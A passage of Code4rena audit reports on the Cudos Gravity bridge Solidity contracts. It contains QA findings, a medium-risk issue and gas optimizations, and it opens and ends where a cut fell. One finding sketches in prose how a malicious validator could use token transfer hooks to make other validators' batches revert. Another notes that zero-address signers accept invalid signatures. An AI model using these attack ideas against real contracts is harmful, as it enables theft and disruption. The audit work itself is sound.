    "body": "## Low Risk Issues\n\n### Summary\n\n| |Title|Instances|\n|-|:-|:-:|\n| 1 | Validator signing address of zero not rejected, allowing anyone to sign | 1 |\n| 2 | Unbounded loops may run out of gas | 1 |\n| 3 | `deployERC20()` does not have a reentrancy guard | 1 |\n| 4 | Comment does not match the behavior of the code | 2 |\n| 5 | `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()` | 1 |\n\nTotal: 6 instances over 5 classes\n(see lower down in this report for the summary table of the Non-critical findings)\n\n### 1. Validator signing address of zero not rejected, allowing anyone to sign\n`ecrecover()` returns `0` when the signature does not match. If the validators approve a valset including an address of `0`, then anyone will be able to sign messages for that signer, since invalid sigatures will return zero, and will match the zero address.\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n185  \t\treturn _signer == ecrecover(messageDigest, _v, _r, _s);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L185\n\n### 2. Unbounded loops may run out of gas\nThe call to `ecrecover()` costs 3000 gas per call, and if there are too many validators, the update of the validator set may pass, but large batches will fail\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n219  \tfunction checkValidatorSignatures(\n220  \t\t// The current validator set and their powers\n221  \t\taddress[] memory _currentValidators,\n222  \t\tuint256[] memory _currentPowers,\n223  \t\t// The current validator's signatures\n224  \t\tuint8[] memory _v,\n225  \t\tbytes32[] memory _r,\n226  \t\tbytes32[] memory _s,\n227  \t\t// This is what we are checking they have signed\n228  \t\tbytes32 _theHash,\n229  \t\tuint256 _powerThreshold\n230  \t) private pure {\n231  \t\tuint256 cumulativePower = 0;\n232  \n233  \t\tfor (uint256 i = 0; i < _currentValidators.length; i++) {\n234  \t\t\t// If v is set to 0, this signifies that it was not possible to get a signature from this validator and we skip evaluation\n235  \t\t\t// (In a valid signature, it is either 27 or 28)\n236  \t\t\tif (_v[i] != 0) {\n237  \t\t\t\t// Check that the current validator has signed off on the hash\n238  \t\t\t\trequire(\n239  \t\t\t\t\tverifySig(_currentValidators[i], _theHash, _v[i], _r[i], _s[i]),\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L219-L239\n\n### 3. `deployERC20()` does not have a reentrancy guard\n`deployERC20()` increments the `state_lastEventNonce` so it's possible for the nonce to be incremented by a transfer hook. I don't see a way to exploit this given the code in scope, but perhaps some other area relies on event nonces happening in a specific order in relation to the other events.\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n611  \tfunction deployERC20(\n612  \t\tstring memory _cosmosDenom,\n613  \t\tstring memory _name,\n614  \t\tstring memory _symbol,\n615  \t\tuint8 _decimals\n616  \t) public {\n617  \t\t// Deploy an ERC20 with entire supply granted to Gravity.sol\n618  \t\tCosmosERC20 erc20 = new CosmosERC20(address(this), _name, _symbol, _decimals);\n619  \n620  \t\t// Fire an event to let the Cosmos module know\n621  \t\tstate_lastEventNonce = state_lastEventNonce.add(1);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L611-L621\n\n### 4. Comment does not match the behavior of the code\nBoth of the functions below have `require(isOrchestrator(msg.sender))`, and orchestrators are the first signer, so not just anyone can call these\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n362  \t// Anyone can call this function, but they must supply valid signatures of state_powerThreshold of the current valset over\n363  \t// the batch.\n364  \tfunction submitBatch (\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L362-L364\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n274  \t// Anyone can call this function, but they must supply valid signatures of state_powerThreshold of the current valset over\n275  \t// the new valset.\n276  \tfunction updateValset(\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L274-L276\n\n### 5. `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`\nUse `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). \"Unless there is a compelling reason, `abi.encode` should be preferred\". If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739).\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n182   \t\tbytes32 messageDigest = keccak256(\n183   \t\t\tabi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", _theHash)\n184   \t\t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L182-L184\n\n\n## Non-critical Issues\n\n### Summary\n\n| |Title|Instances|\n|-|:-|:-:|\n| 1 | Best practice is to prevent signature malleability | 1 |\n| 2 | Inconsistent variable naming convention | 2 |\n| 3 | Inconsistent tabs vs spaces | 3 |\n| 4 | `if(` should be `if (` to match other lines in the file | 1 |\n| 5 | Misleading function name | 1 |\n| 6 | Avoid the use of sensitive terms in favor of neutral ones | 4 |\n| 7 | `public` functions not called by the contract should be declared `external` instead | 10 |\n| 8 | `2**<n> - 1` should be re-written as `type(uint<n>).max` | 1 |\n| 9 | `constant`s should be defined rather than using magic numbers | 3 |\n| 10 | Use a more recent version of solidity | 1 |\n| 11 | Variable names that consist of all capital letters should be reserved for `const`/`immutable` variables | 1 |\n| 12 | Non-library/interface files should use fixed compiler versions, not floating ones | 2 |\n| 13 | Typos | 1 |\n| 14 | File does not contain an SPDX Identifier | 2 |\n| 15 | File is missing NatSpec | 2 |\n| 16 | Event is missing `indexed` fields | 5 |\n| 17 | Consider making the bridge 'pausable' | 1 |\n\nTotal: 41 instances over 17 classes\n\n### 1. Best practice is to prevent signature malleability\nUse OpenZeppelin's `ECDSA` contract rather than calling `ecrecover()` directly\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n182  \t\tbytes32 messageDigest = keccak256(\n183  \t\t\tabi.encodePacked(\"\\x19Ethereum Signed Message:\n32\", _theHash)\n184  \t\t);\n185  \t\treturn _signer == ecrecover(messageDigest, _v, _r, _s);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L182-L185\n\n### 2. Inconsistent variable naming convention\nMost state variables use the `state_` prefix in their variable name. There are some that don't. Use the prefix everywhere, and manually add public getters where necessary\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n63  \tCudosAccessControls public cudosAccessControls;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L63\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n65  \tmapping(address => bool) public whitelisted;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L65\n\n### 3. Inconsistent tabs vs spaces\nMost lines use tabs, but some use spaces, which leads to alignment issues\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n128  \t\t for (uint256 i = 0; i < _users.length; i++) {\n129              require(\n130                  _users[i] != address(0),\n131                  \"User is the zero address\"\n132              );\n133              whitelisted[_users[i]] = _isWhitelisted;\n134          }\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L128-L134\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n117  \t\t require(\n118              whitelisted[msg.sender] || cudosAccessControls.hasAdminRole(msg.sender) ,\n119              \"The caller is not whitelisted for this operation\"\n120          );\n121  \t\t_;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L117-L121\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n647  \t\taddress[] memory _validators,\n648      uint256[] memory _powers,\n649  \t\tCudosAccessControls _cudosAccessControls\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L647-L649\n\n### 4. `if(` should be `if (` to match other lines in the file\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n264  \t\t\tif(_newValset.validators[i] == _sender) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L264\n\n### 5. Misleading function name\n`onlyWhitelisted()` should be `onlyWhitelistedOrAdmin()`\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n116  \tmodifier onlyWhitelisted() {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L116\n\n### 6. Avoid the use of sensitive terms in favor of neutral ones\nUse allowlist rather than whitelist\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n116  \tmodifier onlyWhitelisted() {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L116\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n65  \tmapping(address => bool) public whitelisted;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L65\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n109  \tevent WhitelistedStatusModified(\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L109\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n124  \tfunction manageWhitelist(\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L124\n\n### 7. `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n124   \tfunction manageWhitelist(\n125   \t\taddress[] memory _users,\n126   \t\tbool _isWhitelisted\n127   \t\t) public onlyWhitelisted {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L124-L127\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n140   \tfunction testMakeCheckpoint(ValsetArgs memory _valsetArgs, bytes32 _gravityId) public pure {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L140\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n144   \tfunction testCheckValidatorSignatures(\n145   \t\taddress[] memory _currentValidators,\n146   \t\tuint256[] memory _currentPowers,\n147   \t\tuint8[] memory _v,\n148   \t\tbytes32[] memory _r,\n149   \t\tbytes32[] memory _s,\n150   \t\tbytes32 _theHash,\n151   \t\tuint256 _powerThreshold\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L144-L151\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n166   \tfunction lastBatchNonce(address _erc20Address) public view returns (uint256) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L166\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #5\n\n170   \tfunction lastLogicCallNonce(bytes32 _invalidation_id) public view returns (uint256) {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L170\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #6\n\n276   \tfunction updateValset(\n277   \t\t// The new version of the validator set\n278   \t\tValsetArgs memory _newValset,\n279   \t\t// The current validators that approve the change\n280   \t\tValsetArgs memory _currentValset,\n281   \t\t// These are arrays of the parts of the current validator's signatures\n282   \t\tuint8[] memory _v,\n283   \t\tbytes32[] memory _r,\n284   \t\tbytes32[] memory _s\n285   \t) public nonReentrant {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L276-L285\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #7\n\n364   \tfunction submitBatch (\n365   \t\t// The validators that approve the batch\n366   \t\tValsetArgs memory _currentValset,\n367   \t\t// These are arrays of the parts of the validators signatures\n368   \t\tuint8[] memory _v,\n369   \t\tbytes32[] memory _r,\n370   \t\tbytes32[] memory _s,\n371   \t\t// The batch of transactions\n372   \t\tuint256[] memory _amounts,\n373   \t\taddress[] memory _destinations,\n374   \t\tuint256[] memory _fees,\n375   \t\tuint256 _batchNonce,\n376   \t\taddress _tokenContract,\n377   \t\t// a block height beyond which this batch is not valid\n378   \t\t// used to provide a fee-free timeout\n379   \t\tuint256 _batchTimeout\n380   \t) public nonReentrant {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L364-L380\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #8\n\n479   \tfunction submitLogicCall(\n480   \t\t// The validators that approve the call\n481   \t\tValsetArgs memory _currentValset,\n482   \t\t// These are arrays of the parts of the validators signatures\n483   \t\tuint8[] memory _v,\n484   \t\tbytes32[] memory _r,\n485   \t\tbytes32[] memory _s,\n486   \t\tLogicCallArgs memory _args\n487   \t) public nonReentrant {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L479-L487\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #9\n\n595   \tfunction sendToCosmos(\n596   \t\taddress _tokenContract,\n597   \t\tbytes32 _destination,\n598   \t\tuint256 _amount\n599   \t) public nonReentrant  {\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L595-L599\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #10\n\n611   \tfunction deployERC20(\n612   \t\tstring memory _cosmosDenom,\n613   \t\tstring memory _name,\n614   \t\tstring memory _symbol,\n615   \t\tuint8 _decimals\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L611-L615\n\n### 8. `2**<n> - 1` should be re-written as `type(uint<n>).max`\nEarlier versions of solidity can use `uint<n>(-1)` instead. Expressions not including the `- 1` can often be re-written to accomodate the change (e.g. by using a `>` rather than a `>=`, which will also save some gas)\n\n```solidity\nFile: solidity/contracts/CosmosToken.sol   #1\n\n5   \tuint256 MAX_UINT = 2**256 - 1;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/CosmosToken.sol#L5\n\n### 9. `constant`s should be defined rather than using magic numbers\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n202   \t\tbytes32 methodName = 0x636865636b706f696e7400000000000000000000000000000000000000000000;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L202\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n433   \t\t\t\t\t\t0x7472616e73616374696f6e426174636800000000000000000000000000000000,\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L433\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n535   \t\t\t\t0x6c6f67696343616c6c0000000000000000000000000000000000000000000000,\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L535\n\n### 10. Use a more recent version of solidity\nUse a solidity version of at least 0.8.4 to get `bytes.concat()` instead of `abi.encodePacked(<bytes>,<bytes>)`\nUse a solidity version of at least 0.8.12 to get `string.concat()` instead of `abi.encodePacked(<str>,<str>)`\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n1   pragma solidity ^0.6.6;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L1\n\n### 11. Variable names that consist of all capital letters should be reserved for `const`/`immutable` variables\nIf the variable needs to be different based on which class it comes from, a `view`/`pure` _function_ should be used instead (e.g. like [this](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/76eee35971c2541585e05cbf258510dda7b2fbc6/contracts/token/ERC20/extensions/draft-IERC20Permit.sol#L59)).\n\n```solidity\nFile: solidity/contracts/CosmosToken.sol   #1\n\n5   \tuint256 MAX_UINT = 2**256 - 1;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/CosmosToken.sol#L5\n\n### 12. Non-library/interface files should use fixed compiler versions, not floating ones\n\n```solidity\nFile: solidity/contracts/CosmosToken.sol   #1\n\n1   pragma solidity ^0.6.6;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/CosmosToken.sol#L1\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n1   pragma solidity ^0.6.6;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L1\n\n### 13. Typos\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n564   \t\t// Update invaldiation nonce\n```\ninvaldiation\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L564\n\n### 14. File does not contain an SPDX Identifier\n\n```solidity\nFile: solidity/contracts/CosmosToken.sol   #1\n\n0   pragma solidity ^0.6.6;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/CosmosToken.sol#L0\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n0   pragma solidity ^0.6.6;\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L0\n\n### 15. File is missing NatSpec\n\n```solidity\nFile: solidity/contracts/CosmosToken.sol (various lines)   #1\n\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/CosmosToken.sol\n\n```solidity\nFile: solidity/contracts/Gravity.sol (various lines)   #2\n\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol\n\n### 16. Event is missing `indexed` fields\nEach `event` should use three `indexed` fields if there are three or more fields\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n73   \tevent TransactionBatchExecutedEvent(\n74   \t\tuint256 indexed _batchNonce,\n75   \t\taddress indexed _token,\n76   \t\tuint256 _eventNonce\n77   \t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L73-L77\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #2\n\n85   \tevent ERC20DeployedEvent(\n86   \t\t// FYI: Can't index on a string without doing a bunch of weird stuff\n87   \t\tstring _cosmosDenom,\n88   \t\taddress indexed _tokenContract,\n89   \t\tstring _name,\n90   \t\tstring _symbol,\n91   \t\tuint8 _decimals,\n92   \t\tuint256 _eventNonce\n93   \t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L85-L93\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #3\n\n94   \tevent ValsetUpdatedEvent(\n95   \t\tuint256 indexed _newValsetNonce,\n96   \t\tuint256 _eventNonce,\n97   \t\tuint256 _rewardAmount,\n98   \t\taddress _rewardToken,\n99   \t\taddress[] _validators,\n100   \t\tuint256[] _powers\n101   \t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L94-L101\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #4\n\n102   \tevent LogicCallEvent(\n103   \t\tbytes32 _invalidationId,\n104   \t\tuint256 _invalidationNonce,\n105   \t\tbytes _returnData,\n106   \t\tuint256 _eventNonce\n107   \t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L102-L107\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #5\n\n109   \tevent WhitelistedStatusModified(\n110   \t\taddress _sender,\n111   \t\taddress[] _users,\n112   \t\tbool _isWhitelisted\n113   \t);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L109-L113\n\n### 17. Consider making the bridge 'pausable'\nHaving this ability would help to mitigate attacks and would ameleorate the need for this `withdrawERC20()` to be all-or-nothing\n\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n632  \tfunction withdrawERC20(\n633  \t\taddress _tokenAddress) \n634  \t\texternal {\n635  \t\trequire(cudosAccessControls.hasAdminRole(msg.sender), \"Recipient is not an admin\");\n636  \t\tuint256 totalBalance = IERC20(_tokenAddress).balanceOf(address(this));\n637  \t\tIERC20(_tokenAddress).safeTransfer(msg.sender , totalBalance);\n638  \t}\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L632-L638\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-cudos-findings",
      "repo": "https://github.com/code-423n4/2022-05-cudos-findings",
      "url": "https://github.com/code-423n4/2022-05-cudos-findings/issues/145"
    }
  },
  {
    "title": "Validators can cause transactions where they are not the one being paid the fees, to revert",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L458-L459\n\n\n# Vulnerability details\n\n> The Cudos Network is a special-purpose blockchain designed to provide high-performance, trustless, and permissionless cloud computing for all.\n\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/README.md?plain=1#L14\n\nTo be considered trustless, both the incentives and the code must be aligned to prevent the possibility of maliciousness, especially by actors of the system given specific powers.\n\n## Impact\nA malicious validator can prevent transactions from going through if they're the one not being paid\n\n## Proof of Concept\nThe `submitBatch()` function, which is the only method of doing Cosmos to Ethereum bridges, will revert if any one of the internal transfers reverts, including the transfer of the fee:\n```solidity\nFile: solidity/contracts/Gravity.sol   #1\n\n458               // Send transaction fees to msg.sender\n459               IERC20(_tokenContract).safeTransfer(msg.sender, totalFee);\n```\nhttps://github.com/code-423n4/2022-05-cudos/blob/de39cf3cd1f1e1cf211819b06d4acf6a043acda0/solidity/contracts/Gravity.sol#L458-L459\n\nA malicious validator can set up his/her transfer hook for an asset with transfer hooks, to `revert()` if `tx.origin` does not come from an address he/she controls. The attacker would then send a lot of dust transactions to get picked up in multiple batches. This ensures that only calls to `submitBatch()` that they submit will go through, and thus only they will get the fees. If the validator also has access to the Cosmos side of things and can determine what goes into a batch, they can target specific high-fee transfers by batching them with their dust.\n\nI've marked this one as medium risk because it will be obvious when the validator does this, as only they'll be the ones paid fees, and can potentially be blocked quickly\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nUse a try-catch and if a fee transfer fails, `approve()`/`safeIncreaseAllowance()` the validator for a `transferFrom()`\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-cudos-findings",
      "repo": "https://github.com/code-423n4/2022-05-cudos-findings",
      "url": "https://github.com/code-423n4/2022-05-cudos-findings/issues/143"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Gas\n### [G-01] Cache Array Length Outside of Loop.\n#### Impact\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack. Caching the array length in the stack saves around 3 gas per iteration.\n#### Proof of Concept\n```solidity\nGravity.sol::128 => for (uint256 i = 0; i < _users.length; i++) {\nGravity.sol::233 => for (uint256 i = 0; i < _currentValidators.length; i++) {\nGravity.sol::263 => for (uint256 i = 0; i < _newValset.validators.length; i++) {\nGravity.sol::453 => for (uint256 i = 0; i < _amounts.length; i++) {\nGravity.sol::568 => for (uint256 i = 0; i < _args.transferAmounts.length; i++) {\nGravity.sol::579 => for (uint256 i = 0; i < _args.feeAmounts.length; i++) {\nGravity.sol::660 => for (uint256 i = 0; i < _powers.length; i++) {\n```\n#### Recommendation\nStore the array’s length in a variable before the for-loop.\n\n### [G-02] Use `!= 0` instead of `> 0` for Unsigned Integer Comparison in require statements.\n#### Impact\n`!= 0` is cheapear than `> 0` when comparing unsigned integers in require statements.\n#### Proof of Concept\n#### Recommendation\nUse `!= 0` instead of `> 0`. \n\n### [G-03] Reduce the size of error messages (Long revert Strings).\n#### Impact\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n#### Proof of Concept\n```solidity\nGravity.sol::119 => \"The caller is not whitelisted for this operation\"\nGravity.sol::240 => \"Validator signature does not match.\"\nGravity.sol::256 => \"Submitted validator set signatures do not have enough power.\"\nGravity.sol::291 => \"New valset nonce must be greater than the current nonce\"\nGravity.sol::312 => \"Supplied current validators and powers do not match checkpoint.\"\nGravity.sol::317 => \"The sender of the transaction is not validated orchestrator\"\nGravity.sol::386 => \"New batch nonce must be greater than the current nonce\"\nGravity.sol::392 => \"Batch timeout must be greater than the current block height\"\nGravity.sol::407 => \"Supplied current validators and powers do not match checkpoint.\"\nGravity.sol::418 => \"The sender of the transaction is not validated orchestrator\"\nGravity.sol::496 => \"New invalidation nonce must be greater than the current nonce\"\nGravity.sol::511 => \"Supplied current validators and powers do not match checkpoint.\"\nGravity.sol::517 => \"Malformed list of token transfers\"\nGravity.sol::527 => \"The sender of the transaction is not validated orchestrator\"\nGravity.sol::655 => require(address(_cudosAccessControls) != address(0), \"Access control contract address is incorrect\");\nGravity.sol::668 => \"Submitted validator set signatures do not have enough power.\"\n```\n#### Recommendation\nShorten the revert strings to fit in 32 bytes.\n\n### [G-04] `public` Functions can be `external`.\n#### Impact\n`public` functions that are never called by the contract should be declared `external` to save gas.\n#### Proof of Concept\n```solidity\nmanageWhitelist(address[],bool) should be declared external:\n\t- Gravity.manageWhitelist(address[],bool) (contracts/Gravity.sol#124-136)\ntestMakeCheckpoint(ValsetArgs,bytes32) should be declared external:\n\t- Gravity.testMakeCheckpoint(ValsetArgs,bytes32) (contracts/Gravity.sol#140-142)\ntestCheckValidatorSignatures(address[],uint256[],uint8[],bytes32[],bytes32[],bytes32,uint256) should be declared external:\n\t- Gravity.testCheckValidatorSignatures(address[],uint256[],uint8[],bytes32[],bytes32[],bytes32,uint256) (contracts/Gravity.sol#144-162)\nlastBatchNonce(address) should be declared external:\n\t- Gravity.lastBatchNonce(address) (contracts/Gravity.sol#166-168)\nlastLogicCallNonce(bytes32) should be declared external:\n\t- Gravity.lastLogicCallNonce(bytes32) (contracts/Gravity.sol#170-172)\nupdateValset(ValsetArgs,ValsetArgs,uint8[],bytes32[],bytes32[]) should be declared external:\n\t- Gravity.updateValset(ValsetArgs,ValsetArgs,uint8[],bytes32[],bytes32[]) (contracts/Gravity.sol#276-358)\nsubmitBatch(ValsetArgs,uint8[],bytes32[],bytes32[],uint256[],address[],uint256[],uint256,address,uint256) should be declared external:\n\t- Gravity.submitBatch(ValsetArgs,uint8[],bytes32[],bytes32[],uint256[],address[],uint256[],uint256,address,uint256) (contracts/Gravity.sol#364-468)\nsendToCosmos(address,bytes32,uint256) should be declared external:\n\t- Gravity.sendToCosmos(address,bytes32,uint256) (contracts/Gravity.sol#595-609)\ndeployERC20(string,string,string,uint8) should be declared external:\n\t- Gravity.deployERC20(string,string,string,uint8) (contracts/Gravity.sol#611-630)\n```\n#### Recommendation\nDeclare visibility of functions above as `external`.\n\n### [G-05] No need to initialize variables with default values\n#### Impact\nIf a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n#### Proof of 